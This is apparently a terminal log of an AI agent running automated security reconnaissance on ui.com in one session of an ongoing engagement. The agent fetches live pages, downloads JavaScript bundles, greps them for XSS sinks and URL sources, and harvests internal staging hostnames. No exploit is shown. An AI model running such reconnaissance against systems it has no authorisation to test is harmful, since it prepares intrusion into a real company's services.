+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 javascript
+-rw-r--r-- 1 runner runner 4083 Nov 24 09:36 session5-deep-review.md
+
+result/client-side/account.ui.com/login/javascript:
+total 6980
+drwxr-xr-x 3 runner runner    4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner    4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 7128998 Nov 24 09:36 index-BAUIMHQa.js
+-rw-r--r-- 1 runner runner     708 Nov 24 09:36 manifest.md
+drwxr-xr-x 2 runner runner    4096 Nov 24 09:36 snippets
+
+result/client-side/account.ui.com/login/javascript/snippets:
+total 24
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner  579 Nov 24 09:36 ac-redirect-allowlist.txt
+-rw-r--r-- 1 runner runner 7000 Nov 24 09:36 api-config.txt
+-rw-r--r-- 1 runner runner 1516 Nov 24 09:36 zendesk-html-render.txt
+
+result/client-side/account.ui.com/subscribe:
+total 12
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 1415 Nov 24 09:36 report.md
+
+result/client-side/unifi.ui.com:
+total 12
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 5 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 invite
+
+result/client-side/unifi.ui.com/invite:
+total 16
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 javascript
+-rw-r--r-- 1 runner runner 1979 Nov 24 09:36 report.md
+
+result/client-side/unifi.ui.com/invite/javascript:
+total 12
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+---SERVER-SIDE---
+result/server-side/:
+total 16
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 7 runner runner 4096 Nov 24 09:36 ..
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 account.ui.com
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 cloudaccess.svc.ui.com
+
+result/server-side/account.ui.com:
+total 64
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 3343 Nov 24 09:36 api-inventory.md
+-rw-r--r-- 1 runner runner 2586 Nov 24 09:36 session10-ledger.md
+-rw-r--r-- 1 runner runner 3808 Nov 24 09:36 session16-ledger.md
+-rw-r--r-- 1 runner runner 3797 Nov 24 09:36 session17-ledger.md
+-rw-r--r-- 1 runner runner 4019 Nov 24 09:36 session18-ledger.md
+-rw-r--r-- 1 runner runner 3601 Nov 24 09:36 session19-ledger.md
+-rw-r--r-- 1 runner runner 5382 Nov 24 09:36 session23-ledger.md
+-rw-r--r-- 1 runner runner 4160 Nov 24 09:36 session24-ledger.md
+-rw-r--r-- 1 runner runner 3511 Nov 24 09:36 session25-ledger.md
+-rw-r--r-- 1 runner runner 6145 Nov 24 09:36 session26-ledger.md
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 traffic
+
+result/server-side/account.ui.com/traffic:
+total 48
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 3 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 1751 Nov 24 09:36 session16-endpoints.txt
+-rw-r--r-- 1 runner runner 1246 Nov 24 09:36 session16-mass-assignment.txt
+-rw-r--r-- 1 runner runner  388 Nov 24 09:36 session17-chat-queue.txt
+-rw-r--r-- 1 runner runner  568 Nov 24 09:36 session18-bundle-diff.txt
+-rw-r--r-- 1 runner runner 1278 Nov 24 09:36 session18-legacy-email.txt
+-rw-r--r-- 1 runner runner 4175 Nov 24 09:36 session19-account-chooser-2fa-reset.txt
+-rw-r--r-- 1 runner runner 3388 Nov 24 09:36 session25-zendesk-login-cors-jsonp.txt
+-rw-r--r-- 1 runner runner 4643 Nov 24 09:36 session26-newcover.txt
+
+result/server-side/cloudaccess.svc.ui.com:
+total 12
+drwxr-xr-x 2 runner runner 4096 Nov 24 09:36 .
+drwxr-xr-x 4 runner runner 4096 Nov 24 09:36 ..
+-rw-r--r-- 1 runner runner 1936 Nov 24 09:36 confirm-invitation.md
+[0m
+[0m→ [0mRead result/progress.md
+Let me check the progress report, route inventory, and browser MCP availability.
+[0m→ [0mRead result/inventory/routes.md
+[0m⚙ [0mchrome-devtools_list_pages Unknown
+MCP is available and this is a continuation (Session 27, decision=preserved). Let me set up the session and check current state.
+[0m→ [0mRead result/unresolved.md
+[0m
+[0m$ [0mdate -u +"%Y-%m-%dT%H:%M:%SZ"; echo "---tools---"; for t in opencode curl git node npx python3 jq; do printf "%s: " "$t"; command -v "$t" || echo MISSING; done; echo "---targets sha---"; cat result/logs/targets.sha256 2>/dev/null; sha256sum data/targets.txt; echo "---dirs---"; mkdir -p result/client-side result/server-side result/findings result/inventory result/logs && echo ok
+2026-11-24T09:37:52Z
+---tools---
+opencode: /home/runner/.opencode/bin/opencode
+curl: /usr/bin/curl
+git: /usr/bin/git
+node: /opt/hostedtoolcache/node/22.23.5/x64/bin/node
+npx: /opt/hostedtoolcache/node/22.23.5/x64/bin/npx
+python3: /usr/bin/python3
+jq: /usr/bin/jq
+---targets sha---
+3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a
+3353d9c6fc715d540450657d4347b511e7240287acf630307a924df909733c8a  data/targets.txt
+---dirs---
+ok
+[0m
+[0m→ [0mRead skills/client-side-skill.md
+[0m→ [0mRead skills/server-side-skill.md
+Let me read the required skill files and check the live build state.
+Skills read. Let me record session metadata and check the live build state for changes.
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+cat >> result/logs/session.md <<'EOF'
+
+## Session 27 — 2026-11-24T09:37Z (continuation, decision=preserved)
+- Start: 2026-11-24T09:37:52Z
+- Target: ui.com (domain-only); in-scope components: www/account/sso + observed svc hosts per scope.md
+- Agent/model: opencode / deepseek-v4.1-flash-free
+- Tools: opencode, curl, git, node 22.23.5, npx, python3, jq; Chrome DevTools MCP available (about:blank)
+- Mode: continuation of Session 26; reading preserved inventory/findings first.
+EOF
+echo "--- account.ui.com ---"
+curl -s -o /tmp/acct.html -D /tmp/acct.hdr -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15" https://account.ui.com/ ; head -1 /tmp/acct.hdr; grep -oE '/assets/index-[A-Za-z0-9_-]+\.js' /tmp/acct.html | head; grep -oE 'src="[^"]+\.js"' /tmp/acct.html | head
+echo "--- www.ui.com ---"
+curl -s -o /tmp/www.html -D /tmp/www.hdr -A "Mozilla/5.0" https://www.ui.com/ ; head -1 /tmp/www.hdr; grep -oE '/microsite/static/[A-Za-z0-9_.-]+\.js' /tmp/www.html | head; grep -oE 'dpl=[a-z0-9]+' /tmp/www.html | head -1
+echo "--- sso ---"
+curl -s -o /dev/null -D - -A "Mozilla/5.0" https://sso.ui.com/api/sso/v1/legal | head -3
+--- account.ui.com ---
+HTTP/2 200 
+/assets/index-DUlTrD1u.js
+src="https://static.ada.support/embed2.js"
+src="/assets/index-DUlTrD1u.js"
+--- www.ui.com ---
+HTTP/2 200 
+dpl=6f710854cbbfd59f08058493f6937313e2161848
+--- sso ---
+HTTP/2 200 
+content-type: application/json
+content-length: 94
+[0m
+`www.ui.com` has a **new deployment** (`dpl=6f710854...`, was `ebfbbf36...`). That's new attack surface. Let me investigate it.
+[0m$ [0mcd /tmp && wc -c www.html && echo "--- script/src refs ---" && grep -oE '(src|href)="[^"]+"' www.html | sort -u | head -80 && echo "--- inline route hints ---" && grep -oE '"/[a-zA-Z0-9_./\[\]-]+"' www.html | sort -u | head -60
+368021 www.html
+--- script/src refs ---
+href="/_next/static/chunks/1bt_af6wj0_b1.css?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+href="/_next/static/chunks/28wokyxn_svkv.css?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+href="/_next/static/chunks/2ynngu99984st.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+href="/_next/static/media/facebook.1kjpxt_ip-bqm.svg?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+href="/_next/static/media/instagram.1z6mkdipaccw7.svg?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+href="/_next/static/media/x.367taavrlpz3b.svg?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+href="/_next/static/media/youtube.0-0ubzefboo49.svg?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+href="/uicom/apple-touch-icon.png"
+href="/uicom/favicon-16x16.png"
+href="/uicom/favicon-32x32.png"
+href="/uicom/favicon.ico"
+href="/uicom/fonts/ui-sans-v10-bold.woff2"
+href="/uicom/fonts/ui-sans-v10-light.woff2"
+href="/uicom/fonts/ui-sans-v10-regular.woff2"
+href="/us/en/how-it-works"
+href="/us/en/how-it-works/large"
+href="/us/en/how-it-works/multi-site"
+href="/us/en/whats-new"
+href="https://blog.ui.com/?s=us&amp;l=en"
+href="https://careers.ui.com/"
+href="https://casestudies.ui.com/?s=us&amp;l=en"
+href="https://cdn.cookielaw.org"
+href="https://design.ui.com/"
+href="https://facebook.com/uieverywhere"
+href="https://geolocation.onetrust.com"
+href="https://help.ui.com/hc/en-us"
+href="https://images.svc.ui.com/?u=https%3A%2F%2Fui.com%2F_next%2Fstatic%2Fmedia%2Findustry-leading.07_tfuog_6mnx.webp%3Fdpl%3D6f710854cbbfd59f08058493f6937313e2161848&amp;q=75&amp;w=980"
+href="https://ir.ui.com/"
+href="https://ispdesign.ui.com/"
+href="https://store.ui.com/us/en?s=us&amp;l=en"
+href="https://twitter.com/ubiquiti"
+href="https://ui.com/"
+href="https://ui.com/us/en"
+href="https://ui.com/us/en/cloud-gateways"
+href="https://ui.com/us/en/door-access"
+href="https://ui.com/us/en/integrations/network-storage"
+href="https://ui.com/us/en/partner-hub"
+href="https://ui.com/us/en/physical-security"
+href="https://ui.com/us/en/switching"
+href="https://ui.com/us/en/trust-center"
+href="https://ui.com/us/en/whats-new"
+href="https://ui.com/us/en/wifi"
+href="https://uisp.ui.com/"
+href="https://wifiman.com/"
+href="https://www.googletagmanager.com"
+href="https://www.instagram.com/ubiquiti/"
+href="https://www.ui.com/compliance/"
+href="https://www.ui.com/contact/"
+href="https://www.ui.com/distributors/"
+href="https://www.ui.com/download"
+href="https://www.ui.com/legal/"
+href="https://www.ui.com/legal/privacypolicy/"
+href="https://www.ui.com/legal/termsofservice/"
+href="https://www.ui.com/training#calendar"
+href="https://www.ui.com/training#partners"
+href="https://www.ui.com/training/"
+href="https://www.ui.com/training/become-trainer/"
+href="https://www.youtube.com/user/ubnt?feature=watch"
+src="/_next/static/chunks/01lu87tmwy33h.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/02aqcd17vx73t.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/02artkfhcdhr9.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/08ap5_0xtv1jr.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/099-ze3g9j76l.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0_51puko7iz-f.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0cz1d0mv5g_q7.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0eub7_yarwgaf.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0fndjv7e61i3b.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0l8-cgduqjvpc.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0lb0op5t6a8ex.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0sjscz6_8banh.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0tipfvt-y8dgk.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0urgclzdrg6-o.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0w25l1y4sjmmp.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/0yq4grgdgv_kn.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/1_ehlaxnhrfd3.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/1a12f2fndc6ma.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/1b4ucgmbwd8nt.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/1d5xufar1ui2c.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/1fj3euuy3tlke.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+src="/_next/static/chunks/1o48qqrc8xpkn.js?dpl=6f710854cbbfd59f08058493f6937313e2161848"
+--- inline route hints ---
+[0m
+[0m$ [0mcd /tmp && rm -rf www27 && mkdir -p www27 && grep -oE '/_next/static/chunks/[A-Za-z0-9_.-]+\.js' www.html | sort -u > www27/chunks.txt && wc -l www27/chunks.txt && head -5 www27/chunks.txt
+# also look for buildId and RSC flight hints
+grep -oE '"buildId":"[^"]+"' www.html | head; grep -oE 'self.__next_f' www.html | head -1
+echo "--- download all chunks ---"
+cat www27/chunks.txt | sed 's#^#https://www.ui.com#' | xargs -P 12 -n 1 -I{} sh -c 'f=$(echo "{}" | sed "s#.*/##"); curl -s -A "Mozilla/5.0" "{}" -o "/tmp/www27/$f"' 
+ls www27/*.js | wc -l; du -sh www27
+36 www27/chunks.txt
+/_next/static/chunks/01lu87tmwy33h.js
+/_next/static/chunks/02aqcd17vx73t.js
+/_next/static/chunks/02artkfhcdhr9.js
+/_next/static/chunks/08ap5_0xtv1jr.js
+/_next/static/chunks/099-ze3g9j76l.js
+self.__next_f
+--- download all chunks ---
+xargs: warning: options --max-args and --replace/-I/-i are mutually exclusive, ignoring previous --max-args value
+36
+3.0M	www27
+[0m
+[0m$ [0mcd /tmp/www27
+echo "=== sink grep ==="
+grep -lE 'dangerouslySetInnerHTML|innerHTML|document\.write|insertAdjacentHTML|eval\(|new Function' *.js 2>/dev/null | head -40
+echo "=== count matches ==="
+grep -ohE 'dangerouslySetInnerHTML' *.js | wc -l
+grep -ohE 'innerHTML' *.js | wc -l
+echo "=== additional chunk refs (static/chunks) ==="
+grep -ohE '/_next/static/chunks/[A-Za-z0-9_.-]+\.js' *.js | sort -u | wc -l
+grep -ohE '/_next/static/chunks/[A-Za-z0-9_.-]+\.js' *.js | sort -u | head -20
+echo "=== source/sink keywords ==="
+grep -lE 'location\.(search|hash|href|assign|replace)|URLSearchParams|window\.open|postMessage' *.js | head -40
+echo "=== api endpoints ==="
+grep -ohE 'https?://[a-zA-Z0-9._-]+\.(ui|ubnt|uisp)\.com[^"'"'"'` ]*' *.js | sort -u | head -60
+=== sink grep ===
+08ap5_0xtv1jr.js
+099-ze3g9j76l.js
+0urgclzdrg6-o.js
+1b4ucgmbwd8nt.js
+1o48qqrc8xpkn.js
+1ptv65wlzwg3f.js
+2g8fpf-u7ypyg.js
+2ynngu99984st.js
+3jzk1w2zhrxgq.js
+=== count matches ===
+34
+12
+=== additional chunk refs (static/chunks) ===
+0
+=== source/sink keywords ===
+02aqcd17vx73t.js
+0cz1d0mv5g_q7.js
+0lb0op5t6a8ex.js
+0urgclzdrg6-o.js
+0w25l1y4sjmmp.js
+0yq4grgdgv_kn.js
+1fj3euuy3tlke.js
+1ptv65wlzwg3f.js
+2g8fpf-u7ypyg.js
+2ynngu99984st.js
+3racnxu1ero-m.js
+=== api endpoints ===
+https://academy.ui.com
+https://academy.ui.com/
+https://account.stg.ui.com
+https://account.ui.com
+https://account.ui.com/
+https://account.ui.com/mysupport
+https://blog.ui.com
+https://br.store.ui.com/br
+https://ca.store.ui.com/ca
+https://careers.ui.com/
+https://careers.ui.com/?location=${e}
+https://casestudies.ui.com
+https://cn.store.ui.com/cn
+https://community.dev.ui.com
+https://community.stg.ui.com
+https://community.ui.com
+https://community.ui.com/
+https://creators.ui.com
+https://design.ui.com/
+https://download.dev.svc.ui.com
+https://download.stg.svc.ui.com
+https://download.svc.ui.com
+https://eu.store.ui.com/eu
+https://experts.ui.com
+https://experts.ui.com/
+https://experts.uisp.com
+https://feedback.dev.svc.ui.com
+https://feedback.stg.svc.ui.com
+https://feedback.svc.ui.com
+https://gpt.help.dev.ui.com
+https://gpt.help.ui.com
+https://help.ui.com/hc/en-us
+https://help.ui.com/hc/en-us/articles/10775946997655
+https://help.ui.com/hc/en-us/articles/12395353544727-UniFi-Protect-Storage-Protection-and-Data-Redundancy
+https://help.ui.com/hc/en-us/articles/12825727969815-UniFi-Connect-Automatically-Control-Display-with-Cast
+https://help.ui.com/hc/en-us/articles/14881658961303-UNVR-Stacking
+https://help.ui.com/hc/en-us/articles/15670911603223-UniFi-Connect-Video-Content-Best-Practices
+https://help.ui.com/hc/en-us/articles/18068491373975
+https://help.ui.com/hc/en-us/articles/18125733726615
+https://help.ui.com/hc/en-us/articles/19545148603031-UniFi-Connect-Stream-YouTube-Content-to-Displays
+https://help.ui.com/hc/en-us/articles/20643869756951-UniFi-Connect-Collect-Payment-for-EV-Charging
+https://help.ui.com/hc/en-us/articles/21170042012439-UniFi-Connect-Manage-EV-Stations
+https://help.ui.com/hc/en-us/articles/23407622707735-UniFi-Connect-Present-Media-Content
+https://help.ui.com/hc/en-us/articles/25473982758551
+https://help.ui.com/hc/en-us/articles/360063280653-UniFi-Protect-Supported-Camera-Limits
+https://help.ui.com/hc/en-us/requests/new
+https://help.uisp.com/hc/en-us
+https://images.dev.svc.ui.com/
+https://images.stg.svc.ui.com/
+https://images.svc.ui.com/
+https://in.store.ui.com/in
+https://installers.ui.com
+https://installers.ui.com/
+https://ir.ui.com/
+https://ispdesign.ui.com/
+https://jp.store.ui.com/jp
+https://me.store.ui.com/me
+https://megaphone.dev.svc.ui.com
+https://megaphone.stg.svc.ui.com
+https://megaphone.svc.ui.com
+[0m
+[0m$ [0mcd /tmp/www27
+echo "=== dangerouslySetInnerHTML contexts ==="
+for f in $(grep -lE 'dangerouslySetInnerHTML' *.js); do echo "### $f"; grep -oE '.{80}dangerouslySetInnerHTML.{120}' "$f" | head -6; done 2>/dev/null | head -120
+=== dangerouslySetInnerHTML contexts ===
+### 08ap5_0xtv1jr.js
+x)(AJ,{children:(0,a.jsxs)(AL,{children:[(0,a.jsxs)(Aq,{children:[(0,a.jsx)(Aj,{dangerouslySetInnerHTML:{__html:t(A.title)}}),A.description&&(0,a.jsx)(AP,{children:t(A.description)})]}),(0,a.jsxs)(AY,{children:[A.slides.map
+,{"aria-hidden":"true",children:A.icon}),(0,a.jsx)(A$,{$allowBreaks:i===A1.f.En,dangerouslySetInnerHTML:{__html:t(A.text)}})]},`item-${A.id}`)),(0,a.jsx)(A0,{href:A.cta.link??"#",children:t(A.cta.text)}),A?.slides?.length<4
+### 099-ze3g9j76l.js
+### 0urgclzdrg6-o.js
+(52537),b=new Map,g=new Set,h=e=>{let{src:o,id:r,onLoad:n=()=>{},onReady:t=null,dangerouslySetInnerHTML:a,children:i="",strategy:l="afterInteractive",onError:c,stylesheets:d}=e,p=r||o;if(p&&g.has(p))return;if(b.has(o)){g.ad
+(e=>{s.default.preinit(e,{as:"style"})}),"beforeInteractive"===a)if(!r)return b.dangerouslySetInnerHTML&&(b.children=b.dangerouslySetInnerHTML.__html,delete b.dangerouslySetInnerHTML),(0,l.jsx)("script",{nonce:k,dangerously
+n}:{as:"script",nonce:k,crossOrigin:b.crossOrigin}),(0,l.jsx)("script",{nonce:k,dangerouslySetInnerHTML:{__html:`(self.__next_s=self.__next_s||[]).push(${(0,m.htmlEscapeJsonString)(JSON.stringify([r,{...b,id:o}]))})`}});"af
+ip",isInteractive:!0,position:"bottom",description:e.description&&(0,d.jsx)(r2,{dangerouslySetInnerHTML:{__html:n(e.description)}}),children:(0,d.jsxs)(rJ,{$withHover:!0,$isActive:g===e,ref:e=>{i.current[o]=e},...p(e.url),c
+),children:[(0,d.jsx)(ng,{children:n(e.label)}),!!e?.description&&(0,d.jsx)(nh,{dangerouslySetInnerHTML:{__html:n(e.description)}})]},e.id))}),(0,d.jsx)(ns,{$columnCount:y,children:e?.map(e=>(0,d.jsxs)(nu,{children:[(e?.ite
+lt:"icon"}),(0,d.jsx)(ng,{children:n(e.label)}),!!e?.description&&(0,d.jsx)(nh,{dangerouslySetInnerHTML:{__html:n(e.description)}})]}),!!e.items?.length&&e.items?.map(e=>(0,d.jsxs)(nb,{...w(e.url),ref:o=>{m.current[e.id]=o}
+### 1ptv65wlzwg3f.js
+mentElement)),e)?(0,a.jsx)("html",{ref:this.htmlRef,suppressHydrationWarning:!0,dangerouslySetInnerHTML:{__html:this.rootHtml}}):this.props.children}}let u=i;("function"==typeof n.default||"object"==typeof n.default&&null!=
+u=!0),o=m;break;case"defaultValue":m!==d&&(tu=!0),i=m;break;case"children":case"dangerouslySetInnerHTML":if(null!=m)throw Error(u(137,t));break;default:m!==d&&cf(e,t,p,m,r,d)}}tb(e,o,i,s,c,f,a,l);return;case"select":for(a i
+p=l;break;case"defaultValue":l!==a&&(tu=!0),m=l;break;case"children":break;case"dangerouslySetInnerHTML":if(null!=l)throw Error(u(91));break;default:l!==a&&cf(e,t,o,l,r,a)}tE(e,p,m);return;case"option":for(var h in n)p=n[h]
+c],r.hasOwnProperty(c)&&p!==m&&(null!=p||null!=m))switch(c){case"children":case"dangerouslySetInnerHTML":if(null!=p)throw Error(u(137,t));break;default:cf(e,t,c,p,r,m)}return;default:if(tT(t)){for(var v in n)p=n[v],n.hasOwn
+&s5("scroll",e);return;case"onScrollEnd":null!=r&&s5("scrollend",e);return;case"dangerouslySetInnerHTML":if(null!=r){if("object"!=typeof r||!("__html"in r))throw Error(u(61));if(null!=(n=r.__html)){if(null!=l.children)throw
+n,r)}tu=!0}function cd(e,t,n,r,l,a){switch(n){case"style":tC(e,r,a);return;case"dangerouslySetInnerHTML":if(null!=r){if("object"!=typeof r||!("__html"in r))throw Error(u(61));if(null!=(n=r.__html)){if(null!=l.children)throw
+### 2g8fpf-u7ypyg.js
+d:c,$isSmallDescription:d,$descriptionMaxWidth:m,$shouldCenterDescriptionText:v,dangerouslySetInnerHTML:{__html:n}})]})}],239077),e.s([],567550)},197820,585597,347403,e=>{"use strict";var t=e.i(255101),r=e.i(319371),i=e.i(6
+okeWidth:2})}),!!u&&(0,t.jsx)(o,{"aria-hidden":"true",children:u}),(0,t.jsx)(s,{dangerouslySetInnerHTML:{__html:c}})]})}],347403),e.s([],197820)},224367,572390,e=>{"use strict";var t=e.i(255101),r=e.i(931730),i=e.i(958383),
+### 2ynngu99984st.js
+l",{id:"__next_error__",children:[(0,n.jsx)("head",{children:(0,n.jsx)("style",{dangerouslySetInnerHTML:{__html:a.errorThemeCss}})}),(0,n.jsxs)("body",{children:[(0,n.jsx)("div",{style:a.errorStyles.container,children:(0,n.
+tmlFor:"for",httpEquiv:"http-equiv",noModule:"noModule"},o=["onLoad","onReady","dangerouslySetInnerHTML","children","onError","strategy","stylesheets"];function a(e){return["async","defer","noModule"].includes(e)}function l
+### 3jzk1w2zhrxgq.js
+,t])},218750,570606,e=>{"use strict";var t,r,n,s,i,a=e.i(214843),o=/^((children|dangerouslySetInnerHTML|key|ref|autoFocus|defaultValue|defaultChecked|innerHTML|suppressContentEditableWarning|suppressHydrationWarning|valueLi
+ed)throw V(2);let e=this.instance.toString();if(!e)return[];let t={[q]:"",[Y]:X,dangerouslySetInnerHTML:{__html:e}},r=this.instance.options.nonce||eX();return r&&(t.nonce=r),[c.default.createElement("style",Object.assign({}
+[0m
+[0m$ [0mcd /tmp/www27
+echo "=== useSearchParams / searchParams usage ==="
+grep -ohE '.{60}(useSearchParams|searchParams|useParams|usePathname|URLSearchParams).{100}' *.js | head -40
+echo "=== window.location usage ==="
+grep -ohE '.{50}(window\.location|location\.(href|search|hash|assign|replace)|document\.referrer).{100}' *.js | head -40
+=== useSearchParams / searchParams usage ===
+a(function(){var t=new URL("b?a=1&b=2&c=3","https://a"),e=t.searchParams,r=new URLSearchParams("a=1&a=2&b=3"),n="";return t.pathname="c%20d",e.forEach(function(t,r){e.delet
+20d?a=1&c=3"!==t.href||"3"!==e.get("c")||"a=1"!==String(new URLSearchParams("?a=1"))||!e[Tp]||"a"!==new URL("https://a@b").username||"b"!==new URLSearchParams(new URLSearchPar
+++]:l<c?u[l++]:s[h++];return t},_p=Cp,Fp=dt("iterator"),Bp="URLSearchParams",Dp=Bp+"Iterator",zp=ne.set,Wp=ne.getterFor(Bp),qp=ne.getterFor(Dp),Hp=Ip("fetch"),$p=Ip("Request")
+le:!0}),an(Sv,Bp),Ce({global:!0,constructor:!0,forced:!Mp},{URLSearchParams:Sv}),!Mp&&T(Kp)){var Ov=b(Vp.has),xv=b(Vp.set),Rv=function(t){if(M(t)){var e,r=t.body;if(pr(r)===Bp
+ctor:!0,dontCallGetSet:!0,forced:!0},{Request:Pv})}}var Av={URLSearchParams:Sv,getState:Wp},jv=URLSearchParams,kv=jv.prototype,Iv=b(kv.append),Tv=b(kv.delete),Mv=b(kv.forEach)
+||Iv(this,o.key,o.value)},{enumerable:!0,unsafe:!0});var Nv=URLSearchParams,Cv=Nv.prototype,_v=b(Cv.getAll),Fv=b(Cv.has),Bv=new Nv("a=1");!Bv.has("a",2)&&Bv.has("a",void 0)||i
++]===o)return!0;return!1},{enumerable:!0,unsafe:!0});var Dv=URLSearchParams.prototype,zv=b(Dv.forEach);u&&!("size"in Dv)&&so(Dv,"size",{get:function(){var t=0;return zv(this,f
+(e,"")},fd=Gr.codeAt,ld=ne.set,hd=ne.getterFor("URL"),pd=Av.URLSearchParams,vd=Av.getState,dd=i.URL,gd=i.TypeError,yd=i.parseInt,md=Math.floor,bd=Math.pow,wd=b("".charAt),Sd=b
+n,o,i,a=Wr(t);if(e){if(o=this.parse(a))throw new gd(o);this.searchParams=null}else{if(void 0!==r&&(n=new xg(r,!0)),o=this.parse(a,null,n))throw new gd(o);(i=vd(new pd)).bin
+f:function(t){var e=this.parse(t);if(e)throw new gd(e);this.searchParams.update()},getOrigin:function(){var t=this.scheme,e=this.port;if("blob"===t)try{return new Rg(t.path
+==wd(t,0)&&(t=kd(t,1)),this.query="",this.parse(t,Eg)),this.searchParams.update()},getSearchParams:function(){return this.searchParams.facade},getHash:function(){var t=this
+,Og)):this.fragment=null},update:function(){this.query=this.searchParams.serialize()||null}};var Rg=function(t){var e=ko(this,Pg),r=Up(arguments.length,1)>1?arguments[1]:vo
+tPort(),e.pathname=n.getPathname(),e.search=n.getSearch(),e.searchParams=n.getSearchParams(),e.hash=n.getHash())},Pg=Rg.prototype,Ag=function(t,e){return{get:function(){ret
+hname")),so(Pg,"search",Ag("getSearch","setSearch")),so(Pg,"searchParams",Ag("getSearchParams")),so(Pg,"hash",Ag("getHash","setHash"))),ie(Pg,"toJSON",function(){return hd(
+olve)(n.value),r.promise}}),Ze("Promise","finally");var Hm="URLSearchParams"in self,$m="Symbol"in self&&"iterator"in Symbol,Km="FileReader"in self&&"Blob"in self&&function(){t
+ormData.prototype.isPrototypeOf(t)?this._bodyFormData=t:Hm&&URLSearchParams.prototype.isPrototypeOf(t)?this._bodyText=t.toString():Vm&&Km&&(e=t)&&DataView.prototype.isPrototyp
+pe?this.headers.set("content-type",this._bodyBlob.type):Hm&&URLSearchParams.prototype.isPrototypeOf(t)&&this.headers.set("content-type","application/x-www-form-urlencoded;char
+ow.location.pathname,window.origin),i=new URL("/login",a);i.searchParams.set("redirect",t.toString()),window.location.replace(i)},"f",0,e=>{let t=new URL(window.origin);t.p
+window.location.href).pathname;let i=new URL("/logout",a);i.searchParams.set("redirect",t.toString()),window.location.replace(i)},"t",0,()=>{let e=new URL("/",a);window.ope
+),s=i.slice(l),c=[e,o,...s];return a.pathname=(0,nT.y)(c),a.searchParams.set("l",o),a.toString().replace(a.origin,"")}catch{return}},tF=(e,{nativeFirst:o=!1}={})=>{let r=tC
+te"],lT=lP.J[lP.B],lG=()=>{let e=(0,eC.useRouter)(),o=(0,eC.usePathname)(),r=(0,eH.f)(),{user:n,isPending:t}=(0,lH.f)(),a=(0,u.useMemo)(()=>({loading:t,customer:n,handleLo
+anguage:i}))}})})},l_=({onChange:e})=>{let o="true"===(0,eC.useSearchParams)().get("appview");return(0,u.useEffect)(()=>{e(o)},[o,e]),null},lM=()=>((0,u.useEffect)(()=>{window
+ers",0,({storeId:e,language:t,children:a})=>{let i,l,s=(0,B.usePathname)(),c=n.g.isServer()?ea():o??=ea();i=(0,B.usePathname)(),l=(0,y.useRef)(!0),(0,y.useEffect)(()=>{var
+ct.defineProperty(r,"__esModule",{value:!0});var n={ReadonlyURLSearchParams:function(){return a.ReadonlyURLSearchParams},RedirectType:function(){return d.RedirectType},ServerI
+ror},unstable_rethrow:function(){return d.unstable_rethrow},useParams:function(){return h},usePathname:function(){return m},useRouter:function(){return v},useSearchParam
